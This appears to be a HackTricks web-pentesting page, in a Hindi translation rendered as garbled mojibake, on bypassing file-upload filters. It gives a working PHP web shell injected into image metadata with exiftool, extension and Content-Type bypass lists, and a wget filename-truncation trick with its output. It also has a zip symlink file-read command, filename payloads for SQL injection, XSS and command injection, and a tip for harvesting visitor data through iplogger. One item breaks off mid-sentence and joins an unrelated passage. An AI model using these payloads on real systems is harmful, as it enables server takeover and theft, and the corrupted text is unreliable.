<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

- [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


# рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рд╕рд╛рдорд╛рдиреНрдп рдореЗрдердбреЛрд▓реЙрдЬреА

1. рдПрдХ **рдбрдмрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ \(рдЙрджрд╛ред _file.png.php_ рдпрд╛ _file.png.php5_\)ред
* PHP рдПрдХреНрд╕рдЯреЗрдВрд╢рди: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* ASP рдПрдХреНрд╕рдЯреЗрдВрд╢рди: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдХреБрдЫ рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ **рдЕрдкрд░рдХреЗрд╕** рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдЬреИрд╕реЗ: _.pHp, .pHP5, .PhAr ..._
3. рдХреБрдЫ **рдбрдмрд▓ \(рдпрд╛ рдЕрдзрд┐рдХ\) рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ \(рдЬреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд рдЬрд╛рдВрдЪ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддреА рд╣реИ\):
1. _file.png.php_
2. _file.png.txt.php_
4. **рдЕрдкрд╛рдЪреЗ рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдХрд╛ рд╢реЛрдз** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд░рд┐рд╡рд░реНрд╕ рдбрдмрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ \(рдЬрд╣рд╛рдВ рдХреБрдЫ рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди _.php_ рдХреЗ рд╕рд╛рде рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди **рдЕрдирд┐рд╡рд╛рд░реНрдп рд░реВрдк рд╕реЗ .php рд╕реЗ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧрд╛** рд╡рд╣рд╛рдВ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛\):
* _рдЙрджрд╛ред file.php.png_
5. **рдирд▓ рдХреИрд░реЗрдХреНрдЯрд░ рдХреЗ рд╕рд╛рде рдбрдмрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди**: 
1. _рдЙрджрд╛ред file.php%00.png_
6. рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ **рдЕрдВрдд рдореЗрдВ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг** рдЬреЛрдбрд╝реЗрдВ_: %00, %20, \(рдХрдИ рдбреЙрдЯреНрд╕\)...._
1. _рдЙрджрд╛ред file.php%00_
2. _рдЙрджрд╛ред file.php%20_
3. _рдЙрджрд╛ред file.php...... --&gt; рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рдЬрдм рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбреЙрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╡реЗ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рдПрдВрдЧреЗ \(рдЗрд╕рд▓рд┐рдП рдЖрдк .php рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ\)_
4. _рдЙрджрд╛ред file.php/_
5. _рдЙрджрд╛ред file.php.\_
7. **Content-Type** **рд╣реИрдбрд░** рдХреЗ **рдорд╛рди** рдХреЛ рд╕реЗрдЯ рдХрд░рдХреЗ Content-Type рдЬрд╛рдВрдЪ рдХреЛ рдЫрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ: _image/png_ , _text/plain , application/octet-stream_
8. **рдореИрдЬрд┐рдХ рдирдВрдмрд░ рдЬрд╛рдВрдЪ** рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЫрд╡рд┐ рдХреЗ **рдмрд╛рдЗрдЯ** рдЬреЛрдбрд╝реЗрдВ \(рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЧреБрдорд░рд╛рд╣ рдХрд░реЗрдВ\)ред рдпрд╛ рд╢реЗрд▓ рдХреЛ **рдореЗрдЯрд╛рдбреЗрдЯрд╛** рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд░реЗрдВ: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯ** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреЗрд╡рд▓ **рдЬрд╛рдВрдЪреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ** рдФрд░ рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдлрд╝рд╛рдЗрд▓ рдХреЗ рдХрд╣реАрдВ рднреА рд╕реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
9. **Windows** рдореЗрдВ **NTFS рд╡реИрдХрд▓реНрдкрд┐рдХ
рдлрд╝рд╛рдЗрд▓реЗрдВ `.phar` рдЬрд╛рд╡рд╛ рдХреЗ рд▓рд┐рдП `.jar` рдХреА рддрд░рд╣ рд╣реИрдВ, рд▓реЗрдХрд┐рди php рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рдФрд░ рдЗрд╕реЗ **рдПрдХ php рдлрд╝рд╛рдЗрд▓ рдХреА рддрд░рд╣ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** \(php рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдпрд╛ рдЗрд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рднреАрддрд░ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдХреЗ...\)

`.inc` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрднреА-рдХрднреА рдЙрди php рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░, рдХрд┐рд╕реА рдиреЗ **рдЗрд╕ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

**BurpSuit рдкреНрд▓рдЧрдЗрди рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реА рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **рдпрд╛ рдПрдХ рдХрдВрд╕реЛрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдЕрдкрд▓реЛрдб рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрддрд╛ рд╣реИ рдФрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ:** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **wget рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб/SSRF рдЯреНрд░рд┐рдХ**

рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдпрд╣ рджреЗрдЦрдиреЗ рдХреЛ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╕рд░реНрд╡рд░ **`wget`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ **рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЖрдк **URL** рдХреЛ **рдЗрдВрдЧрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдХреЛрдб рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдПрдХ whitelist рдореЗрдВ рд╣реИ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реА рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рджреВрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред
**рд▓рд┐рдирдХреНрд╕** рдореЗрдВ рдПрдХ **рдлрд╝рд╛рдЗрд▓рдирд╛рдо** рдХреА **рдЕрдзрд┐рдХрддрдо** рд▓рдВрдмрд╛рдИ **255** рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, **wget** рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдХреЛ **236** рд╡рд░реНрдгреЛрдВ рддрдХ рдХрд╛рдЯ рджреЗрддрд╛ рд╣реИред рдЖрдк **"A"\*232+".php"+".gif"** рдирд╛рдордХ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдЬрд╛рдВрдЪ рдХреЛ **рджреВрд░ рдХрд░реЗрдЧрд╛** \(рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **".gif"** рдПрдХ **рд╡реИрдз** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╣реИ\) рд▓реЗрдХрд┐рди `wget` рдлрд╝рд╛рдЗрд▓ рдХреЛ **"A"\*232+".php"** рдирд╛рдо рд╕реЗ рдкреБрдирд░реНрдирд╛рдорд┐рдд рдХрд░реЗрдЧрд╛ред
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: тАШAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpтАЩ

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - тАШAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpтАЩ saved [10/10]
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдорди рдореЗрдВ рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╣реИ рдХрд┐ **HTTP рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдВ**, рддреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ URL рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдЧрд╛, рдлрд┐рд░ wget рдирдП рдирд╛рдо рдХреЗ рд╕рд╛рде рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдЧрд╛ред рдпрд╣ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛** **рдЬрдм рддрдХ** wget рдХреЛ **рдкреИрд░рд╛рдореАрдЯрд░** `--trust-server-names` рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ, рдХреНрдпреЛрдВрдХрд┐ **wget рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдкреГрд╖реНрда рдХреЛ рдореВрд▓ URL рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреЗ рд╕рд╛рде рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдЧрд╛**ред

# рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рд╕реЗ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧреЛрдВ рддрдХ

* **рдлрд╝рд╛рдЗрд▓рдирд╛рдо** рдХреЛ `../../../tmp/lol.png` рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ
* **рдлрд╝рд╛рдЗрд▓рдирд╛рдо** рдХреЛ `sleep(10)-- -.jpg` рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдЖрдк рдПрдХ **SQL рдЗрдВрдЬреЗрдХреНрд╢рди** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **рдлрд╝рд╛рдЗрд▓рдирд╛рдо** рдХреЛ `<svg onload=alert(document.comain)>` рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдПрдХ **XSS** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рдлрд╝рд╛рдЗрд▓рдирд╛рдо** рдХреЛ `; sleep 10;` рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдХреБрдЫ рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ \(рдЕрдзрд┐рдХ [рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдЯреНрд░рд┐рдХреНрд╕ рдпрд╣рд╛рдВ](command-injection.md)\)
* [**рдЫрд╡рд┐ \(svg\) рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб** рдореЗрдВ XSS](xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** рдлрд╝рд╛рдЗрд▓ **рдЕрдкрд▓реЛрдб** + **XSS** = [**рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░реА** рд╢реЛрд╖рдг](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**svg рдЕрдкрд▓реЛрдб рдореЗрдВ XXE**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ**](open-redirect.md#open-redirect-uploading-svg-files)
* [рдкреНрд░рд╕рд┐рджреНрдз **ImageTrick** рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* рдпрджрд┐ рдЖрдк **рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ URL рд╕реЗ рдЫрд╡рд┐ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреЗрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк [SSRF](ssrf-server-side-request-forgery.md) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдпрд╣ **рдЫрд╡рд┐** рдХрд┐рд╕реА **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рд╕рд╛рдЗрдЯ рдореЗрдВ **рд╕рд╣реЗрдЬреА** рдЬрд╛рдПрдЧреА, рддреЛ рдЖрдк [https://iplogger.org/invisible/](https://iplogger.org/invisible/) рд╕реЗ рдПрдХ URL рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдЖрдЧрдВрддреБрдХ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдпрд╣рд╛рдВ рдПрдХ рд╢реАрд░реНрд╖ 10 рд╕реВрдЪреА рд╣реИ рдЬрд┐рдирдХреЗ рджреНрд╡рд╛рд░рд╛ рдЖрдк рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдХреБрдЫ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ \(рд╕реНрд░реЛрдд рд╕реЗ [рд▓рд┐рдВрдХ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: рд╡реЗрдмрд╢реЗрд▓ / RCE
2. **SVG**: рд╕реНрдерд╛рдпреА XSS / SSRF / XXE
3. **GIF**: рд╕реНрдерд╛рдпреА XSS / SSRF
4. **CSV**: CSV рдЗрдВрдЬреЗрдХреНрд╢рди
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML рдЗрдВрдЬреЗрдХреНрд╢рди / XSS / рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ
8. **PNG / JPEG**: рдкрд┐рдХреНрд╕реЗрд▓ рдмрд╛рдврд╝ рд╣рдорд▓рд╛ \(DoS\)
9. **ZIP**: LFI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

# рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдкрд▓реЛрдб

рдпрджрд┐ рдЖрдк рдПрдХ рдЬрд╝рд┐рдк рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рд╣реЛрдЧрд╛, рддреЛ рдЖрдк рджреЛ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

## рд╕рд┐рдВрдмрд▓рд┐рдВрдХ

рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд╕реЙрдлрд╝реНрдЯ рд▓рд┐рдВрдХреНрд╕ рдХреЛ рд╕рдорд░реНрдкрд┐рдд рдПрдХ рд▓рд┐рдВрдХ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдлрд┐рд░, рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╣реБрдП рдЖрдк рд▓рд┐рдВрдХрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪреЗрдВрдЧреЗ:
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## рд╡рд┐рднрд┐рдиреНрди рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд░реЗрдВ

рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд┐рдП рдЧрдП рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рдмрдирд╛рдИ рдЬрд╛рдПрдВрдЧреАред

